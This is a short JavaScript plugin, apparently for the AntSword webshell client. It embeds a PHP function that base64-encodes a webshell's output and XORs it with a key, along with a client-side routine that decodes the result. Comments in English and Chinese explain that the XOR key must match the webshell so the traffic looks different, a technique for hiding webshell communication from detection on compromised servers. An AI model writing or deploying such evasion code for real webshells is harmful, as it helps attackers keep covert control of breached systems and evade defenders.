/**
 * php::x1_xor_decoder
 * Create at: 2020/11/19 17:07:35
 * Author: Xiaopan233
 */
'use strict';

module.exports = {
  // Notice:Here are two "$number".Don't miss them
  // $number is the value to XOR with the traffic.After modification, the traffic will be different.You must config it be consistent with Webshell.
  // 注意这里有两个$number
  //$number变量为与流量异或的值 修改后流量会变得不一样。必须配置与Webshell端一致
  asoutput: () => {
    return `function asenc($out){
        $number=2;
        $res = '';
        $out = base64_encode($out);
        for ($i=0; $i < strlen($out); $i++) { 
          $res .= ord($out[$i])^$number;
          $res .= '/';
        }
        return rtrim($res,'/'); 
    }
    `.replace(/\n\s+/g, '');
  },
  
  decode_buff: (data, ext={}) => {
      var number=2;
      var res = '';
      var s = data.toString()
      s = s.split("/")
      for(var i in s){
        if(i == "unique"){
          break
        }
        var n = s[i]^number
        res += String.fromCharCode(n)
      }
    return atob(res);
  }
}